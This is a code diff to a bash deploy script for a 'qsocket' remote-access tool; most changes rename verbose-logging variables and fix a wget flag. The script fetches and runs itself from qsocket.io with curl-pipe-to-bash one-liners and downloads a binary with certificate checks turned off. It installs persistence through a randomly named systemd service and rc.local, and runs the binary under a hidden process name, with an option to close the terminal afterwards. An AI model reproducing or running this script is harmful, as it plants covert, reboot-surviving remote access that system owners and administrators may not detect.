@@ -6,10 +6,13 @@
 #
 # This script is typically invoked like this as root or non-root user:
 #   $ bash -c "$(curl -fsSL qsocket.io/x)"
-#   $ bash -c "$(wget --no-verbose -O- qsocket.io/x)"
+#   $ bash -c "$(wget -q -O- qsocket.io/0)"
 #
 # Pre-set a secret:
-#   $ S=MySecret bash -c "$(curl -fsSL qsocket.io/x)"
+#   $ S=MySecret bash -c "$(curl -fsSL qsocket.io/0)"
+#
+# Close terminal window when done
+# $ $HIDE=1 bash -c "$(curl -fsSL qsocket.io/0)"
 #
 # Steps taken:
 # 1. Init defauls, get user supplied parameters.
@@ -23,7 +26,7 @@
 # 6. Enable persistance based on current privs.
 
 # Other variables:
-# VERBOSE=1 -> Verbose output.
+# QS_DEBUG=1 -> Verbose output.
 
 print_banner() {
 	cat <<__BANNER__
@@ -57,7 +60,7 @@ print_status() {
 }
 
 print_progress() {
-	[[ -n "${VERBOSE}" ]] && return
+	[[ -n "${QS_DEBUG}" ]] && return
     echo -n "${YELLOW}[*] ${RESET}"
 	echo -n "$1"
 	n=${#1}
@@ -81,28 +84,28 @@ print_good() {
   echo "${GREEN}[+] ${RESET}${1}"
 }
 
-print_verbose() {
-  if [[ -n "${VERBOSE}" ]]; then
+print_debug() {
+  if [[ -n "${QS_DEBUG}" ]]; then
     echo "${WHITE}[*] ${RESET}${1}"
   fi
 }
 
 print_ok(){
-	[[ -z "${VERBOSE}" ]] && echo -e " [${GREEN}OK${RESET}]"
+	[[ -z "${QS_DEBUG}" ]] && echo -e " [${GREEN}OK${RESET}]"
 }
 
 print_fail(){
-	[[ -z "${VERBOSE}" ]] && echo -e " [${RED}FAIL${RESET}]"
+	[[ -z "${QS_DEBUG}" ]] && echo -e " [${RED}FAIL${RESET}]"
 }
 
 must_exist() {
   for i in "$@"; do
-		command -v "$i" >"$ERR_LOG" || print_fatal "$i not installed! Exiting..."
+		command -v "$i" &>"$ERR_LOG" || print_fatal "$i not installed! Exiting..."
   done
 }
 
 one_must_exist() {
-	command -v "$1" >"$ERR_LOG" || command -v "$2" >"$ERR_LOG" || print_fatal "Neither $1 nor $2 installed! Exiting..."
+	command -v "$1" &> "$ERR_LOG" || command -v "$2" &>"$ERR_LOG" || print_fatal "Neither $1 nor $2 installed! Exiting..."
 }
 
 ## Handle SININT
@@ -211,12 +214,12 @@ download_util() {
 	local ACCEPT_HEADER="Accept: application/octet-stream"
 	DOWNLOAD_URL=$(get_latest_release_url)
 	[[ -z $DOWNLOAD_URL ]] && DOWNLOAD_URL="${GITHUB_RELEASE_URL}/${FALLBACK_RELEASE}/${BIN_NAME}" # Switch to a static fallback release
-	print_verbose "Downloading: $DOWNLOAD_URL -> $1"
+	print_debug "Downloading: $DOWNLOAD_URL -> $1"
 	WGET_BIN=$(command -v wget)
 	CURL_BIN=$(command -v curl)
 	[[ -n $CURL_BIN ]] && curl -s -k -L -H "$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>"$ERR_LOG" && return 0
-	[[ -n $WGET_BIN ]] && wget -q --no-check-certificate --header="$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>"$ERR_LOG" && return 0
-	print_verbose "All download methods failed!"
+	[[ -n $WGET_BIN ]] && wget -q --no-check-certificate --header="$ACCEPT_HEADER" "$DOWNLOAD_URL" -O "$1" &>"$ERR_LOG" && return 0
+	print_debug "All download methods failed!"
 	return 1
 }
 
@@ -241,9 +244,9 @@ unpack_util() {
 # try_dstdir "/tmp/.qs-foobar/xxx"
 # Return 0 on success.
 check_exec_dir(){
-	[[ ! -d "$(dirname "$1")" ]] && print_verbose "$i is not a directory!" && return 1
-	[[ ! -w "$1" ]] && print_verbose "$1 directory not writable!" && return 1;
-	[[ ! -x "$1" ]] && print_verbose "$1 directory not executable!" && return 1;
+	[[ ! -d "$(dirname "$1")" ]] && print_debug "$i is not a directory!" && return 1
+	[[ ! -w "$1" ]] && print_debug "$1 directory not writable!" && return 1;
+	[[ ! -x "$1" ]] && print_debug "$1 directory not executable!" && return 1;
 	return 0;
 }
 
@@ -295,14 +298,14 @@ create_qs_dir() {
 
 
 install_system_systemd(){
-	[[ ! -d "/etc/systemd/system" ]] && print_verbose "/etc/systemd/system not found!" && return 1
-	[[ ! -f $(command -v systemctl) ]] && print_verbose "systemctl not found!" && return 1
-	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && print_verbose "systemd is not running!" && return 1
+	[[ ! -d "/etc/systemd/system" ]] && print_debug "/etc/systemd/system not found!" && return 1
+	[[ ! -f $(command -v systemctl) ]] && print_debug "systemctl not found!" && return 1
+	[[ "$(systemctl is-system-running 2>/dev/null)" =~ (offline|^$) ]] && print_debug "systemd is not running!" && return 1
 	if [[ -f "${SERVICE_FILE}" ]]; then	
 		print_error "${SERVICE_FILE} already exists."
 		return 0
 	fi
-	print_verbose "Systemd dervice name: $RAND_NAME"
+	print_debug "Systemd dervice name: $RAND_NAME"
 
 	# Create the service file
 	echo "[Unit]
@@ -320,12 +323,12 @@ ExecStart=/bin/bash -c \"QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PAT
 WantedBy=multi-user.target" > "${SERVICE_FILE}"
 
 	chmod 600 "${SERVICE_FILE}"
-	systemctl enable "${RAND_NAME}" &>"$ERR_LOG" || { print_verbose "Failed enabling service!"; rm -f "${SERVICE_FILE}"; return 1; } # did not work... 
+	systemctl enable "${RAND_NAME}" &>"$ERR_LOG" || { print_debug "Failed enabling service!"; rm -f "${SERVICE_FILE}"; return 1; } # did not work... 
 	return 0
 }
 
 install_system_rclocal(){
-	[[ ! -f "${RCLOCAL_FILE}" ]] && print_verbose "$RCLOCAL_FILE not found! skipping to next method..." && return 1
+	[[ ! -f "${RCLOCAL_FILE}" ]] && print_debug "$RCLOCAL_FILE not found! skipping to next method..." && return 1
 	if grep -q "QS_ARGS" "${RCLOCAL_FILE}" &>"$ERR_LOG"; then
 		print_error "Already installed in ${RCLOCAL_FILE}." && return 0
 	fi
@@ -455,7 +458,7 @@ install() {
 
 init_problematic_vars() {
 	# Verbose error logs
-	[[ -n "$VERBOSE" ]] && ERR_LOG="$(tty)"
+	[[ -n "$QS_DEBUG" ]] && ERR_LOG="$(tty)"
 
 	# Docker does not set USER
 	[[ -z "$USER" ]] && USER=$(id -un)
@@ -541,7 +544,7 @@ else
   print_fail 
   print_fatal "Archive unpacking failed! Exiting..."
 fi
-print_verbose "QSocket dir: $QS_PATH"
+print_debug "QSocket dir: $QS_PATH"
 print_progress "Testing qsocket binaries"
 if $QS_PATH -h &>"$ERR_LOG";then 
   print_ok 
